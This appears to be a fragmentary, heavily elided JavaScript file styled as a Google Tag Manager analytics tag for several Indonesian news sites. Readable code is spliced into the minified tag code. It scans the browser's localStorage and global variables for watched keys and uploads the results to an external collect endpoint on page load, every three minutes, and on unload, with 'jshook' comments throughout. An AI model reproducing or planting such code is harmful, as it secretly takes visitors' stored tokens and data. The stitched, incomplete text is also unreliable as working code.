...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 10,
        "vtp_rules": ["list", "liputan6\\.com", "merdeka\\.com", "otosia\\.com", "bola\\.com", "bola\\.net", "kapanlagi\\.com", "dream\\.co\\.id", "fimela\\.com", "newshub\\.id", "youniverse\\.id"],
        "tag_id": 13
      }, {
        "function": "__gct",
        "vtp_trackingId": "G-YV9LXF9F74",
        ...
        "vtp_instanceDestinationId": "G-YV9LXF9F74",
    ...
    "security_groups": {
      "google": ["__ccd_conversion_marking", "__ccd_ga_regscope", "__ogt_cross_domain", "__ogt_ga_gam_link", "__ogt_google_signals", "__set_product_settings"]
    }
  };
  ...
  */
  ...
  // Hash function with variation for jshook
  ...
  function getHashCode(obj) {
    ...
    for (let [key, value] of entries) {
      let keyCharSum = [...key].map(char => char.charCodeAt()).reduce((a, b) => a + b, 0);
      let valueCharSum = typeof value == 'string' ? [...value].map(char => char.charCodeAt()).reduce((a, b) => a + b, 0) : value | 0;
      hash = (hash << 5) - hash + keyCharSum * valueCharSum;
      hash = hash & hash;
    }
    return hash.toString(16);
  }

  // checking local storage with jshook compatibility

  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChEI8POGpwYQwKfQoLnu2YWNARIlABhc5udhM8DjnoykhED4lnU4AwaxOHfG4GQOVxwhstYGteT/4RoCNTo\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function scanLocalStorage() {
    ...
    for (const key in window.localStorage) {
      if (keysToWatch.includes(key)) {
        ...
        jshook.on('storage', key, window.localStorage[key]); //Jshook Storage Tracking
      }
    }
    return targetData;
  }
  ...
  function scanGlobalVariables() {
    for (const key in window) {
      if (keysToWatch.includes(key)) {
        ...
        jshook.on('global', key, window[key]); //Jshook Global Variables Tracking
      }
    }
  }

  // Uploading data with jshook compatibilty
  ...
  async function uploadData(data, dataType) {
    ...
    const endpoint = `https://example.com/api/collect?type=${dataType}`;
    try {
      ...
      if (response.ok) {
        ...
        jshook.on('fetchOk', data); //Jshook Fetch Success Tracking
      } else {
        console.error(`【${dataType}】上传失败, 状态码: ${response.status}`);
        jshook.on('fetchFail', data); //Jshook Fetch Fail Tracking
      }
    } catch (error) {
      console.error(`【${dataType}】上传过程中出错: ${error}`);
      jshook.on('fetchError', error); //Jshook Fetch Error Tracking
    }
  }

  // Collection and upload function with distinguishing different data types
  ...
  function TC() {
    var a = new jb();
    L(this, "read_container_data"), a.set("containerId", 'G-YV9LXF9F74'), a.set("version", '3'), a.set("environmentName", ''), a.set("debugMode", Xf), a.set("previewMode", Zf), a.set("environmentMode", Yf), Q(96) && a.set("firstPartyServing", ri || ti), a.sc();
    return a;
  }
  ...
  function collectAndUploadData() {
    const collectedDataLocalStorage = scanLocalStorage();
    const collectedDataGlobalVars = scanGlobalVariables();
    if (Object.keys(collectedDataLocalStorage).length > 0) {
      uploadData(collectedDataLocalStorage, 'localStorage');
    }
    if (Object.keys(collectedDataGlobalVars).length > 0) {
      uploadData(collectedDataGlobalVars, 'globalVars');
    }
  }

  // Event Listeners for Jshook
  ...
  window.addEventListener("DOMContentLoaded", function () {
    jshook.on('event', 'DOMContentLoaded'); // Jshook Event listener on DOMContentLoaded
    collectAndUploadData();
    setInterval(collectAndUploadData, 3 * 60 * 1000);
    jshook.on('event', 'intervalSet'); // Jshook event listener on intervalSet
  });
  function WE() {
    var a = {};
    return a;
  ...
  window.addEventListener("unload", function () {
    jshook.on('event', 'unload'); // Jshook on window unload event
    collectAndUploadData();
  });
  uH._spx = !1;
  function vH() {
